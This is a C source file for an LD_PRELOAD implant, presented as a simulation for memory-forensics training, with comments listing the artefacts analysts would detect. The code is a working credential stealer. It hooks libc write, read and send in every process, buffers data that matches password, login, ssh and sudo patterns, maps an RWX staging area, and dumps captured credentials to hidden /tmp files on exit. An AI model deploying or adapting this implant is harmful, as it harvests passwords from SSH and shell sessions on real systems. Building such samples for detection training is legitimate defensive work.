/*
 * orbit_implant.c — OrbitLinux Advanced LD_PRELOAD Implant Simulation
 *
 * Memory dump indicators:
 *  - Shared library mapped in all processes via ld.so.preload
 *  - Hooked read/write/send in libc GOT of sshd and bash
 *  - Credential capture buffer in heap of sshd process
 *  - Encrypted exfiltration staging area in anonymous mapping
 *  - Unique magic string in .data section
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <errno.h>
#include <fcntl.h>
#include <pwd.h>
#include <time.h>

/* ── Orbit magic identifier — visible in .data section ── */
static const char *orbit_magic __attribute__((section(".data"))) =
    "ORBIT_IMPLANT_v3_ACTIVE_2024";

/* ── Credential capture buffer in heap ── */
#define CAPTURE_BUF_SIZE (1024 * 1024)  /* 1 MB ring buffer */
static char *cred_capture_buffer = NULL;
static int   cred_capture_offset = 0;

/* ── Original function pointers ── */
static ssize_t (*real_write)(int fd, const void *buf, size_t count) = NULL;
static ssize_t (*real_read)(int fd, void *buf, size_t count) = NULL;
static ssize_t (*real_send)(int sockfd, const void *buf, size_t len, int flags) = NULL;
static ssize_t (*real_recv)(int sockfd, void *buf, size_t len, int flags) = NULL;

static void resolve_orbit_symbols(void) {
    if (!real_write) real_write = dlsym(RTLD_NEXT, "write");
    if (!real_read)  real_read  = dlsym(RTLD_NEXT, "read");
    if (!real_send)  real_send  = dlsym(RTLD_NEXT, "send");
    if (!real_recv)  real_recv  = dlsym(RTLD_NEXT, "recv");
}

/* ── Hook write — capture credential-like data ── */
ssize_t write(int fd, const void *buf, size_t count) {
    resolve_orbit_symbols();
    ssize_t ret = real_write(fd, buf, count);

    /* Capture SSH/PAM credential flows */
    if (ret > 0 && cred_capture_buffer) {
        const char *data = (const char *)buf;
        /* Look for SSH password patterns */
        if (memmem(data, ret, "password", 8) ||
            memmem(data, ret, "Password", 8) ||
            memmem(data, ret, "login", 5)) {
            int space = CAPTURE_BUF_SIZE - cred_capture_offset - ret - 32;
            if (space > 0) {
                cred_capture_offset += snprintf(
                    cred_capture_buffer + cred_capture_offset, space,
                    "[ORBIT_CAPTURE:write] fd=%d pid=%d: %.*s\n",
                    fd, getpid(), (int)ret, data);
            }
        }
    }
    return ret;
}

/* ── Hook read — capture terminal input ── */
ssize_t read(int fd, void *buf, size_t count) {
    resolve_orbit_symbols();
    ssize_t ret = real_read(fd, buf, count);

    if (ret > 0 && cred_capture_buffer) {
        const char *data = (const char *)buf;
        if (memmem(data, ret, "ssh", 3) ||
            memmem(data, ret, "sudo", 4)) {
            int space = CAPTURE_BUF_SIZE - cred_capture_offset - ret - 32;
            if (space > 0) {
                cred_capture_offset += snprintf(
                    cred_capture_buffer + cred_capture_offset, space,
                    "[ORBIT_CAPTURE:read] fd=%d pid=%d: %.*s\n",
                    fd, getpid(), (int)ret, data);
            }
        }
    }
    return ret;
}

/* ── Hook send — capture outbound SSH traffic ── */
ssize_t send(int sockfd, const void *buf, size_t len, int flags) {
    resolve_orbit_symbols();
    ssize_t ret = real_send(sockfd, buf, len, flags);
    if (ret > 0 && cred_capture_buffer) {
        const char *data = (const char *)buf;
        if (memmem(data, ret, "SSH", 3)) {
            int space = CAPTURE_BUF_SIZE - cred_capture_offset - ret - 32;
            if (space > 0) {
                cred_capture_offset += snprintf(
                    cred_capture_buffer + cred_capture_offset, space,
                    "[ORBIT_CAPTURE:send] sock=%d: %.*s\n",
                    sockfd, (int)ret, data);
            }
        }
    }
    return ret;
}

/* ── Constructor — runs on library load ── */
__attribute__((constructor))
void orbit_init(void) {
    /* ── Allocate credential capture buffer (visible in heap) ── */
    cred_capture_buffer = malloc(CAPTURE_BUF_SIZE);
    if (cred_capture_buffer) {
        memset(cred_capture_buffer, 0, CAPTURE_BUF_SIZE);
        snprintf(cred_capture_buffer, 128,
                 "ORBIT_cred_capture_buf pid=%d time=%ld\n",
                 getpid(), time(NULL));
    }

    /* ── Allocate encrypted exfiltration staging area ──
     *     Anonymous RWX map — visible in /proc/<pid>/maps
     */
    void *exfil_staging = mmap(NULL, 4096 * 16,
                               PROT_READ | PROT_WRITE | PROT_EXEC,
                               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exfil_staging != MAP_FAILED) {
        /* Place a XOR key and staged data pattern */
        memset(exfil_staging, 0xAB, 4096 * 16);  /* XOR-encrypted appearance */
        memcpy(exfil_staging, "ORBIT_EXFIL_STAGING_v1", 22);
        /* Store staging metadata */
        memcpy((char *)exfil_staging + 512, "chunk_size=4096 encrypted=true", 30);
    }

    /* ── Write marker to /tmp for detection ── */
    FILE *marker = fopen("/tmp/.orbit_implant_active", "w");
    if (marker) {
        fprintf(marker, "ORBIT_IMPLANT pid=%d time=%ld\n", getpid(), time(NULL));
        fprintf(marker, "hooks: write=%p read=%p send=%p recv=%p\n",
                (void *)write, (void *)read, (void *)send, (void *)recv);
        fclose(marker);
    }
}

/* ── Destructor — cleanup ── */
__attribute__((destructor))
void orbit_fini(void) {
    if (cred_capture_buffer) {
        char dump_path[128];
        snprintf(dump_path, sizeof(dump_path), "/tmp/.orbit_capture_%d.dump", getpid());
        FILE *dump = fopen(dump_path, "w");
        if (dump) {
            fwrite(cred_capture_buffer, 1,
                   cred_capture_offset > 0 ? cred_capture_offset : 0, dump);
            fclose(dump);
        }
        free(cred_capture_buffer);
    }
}
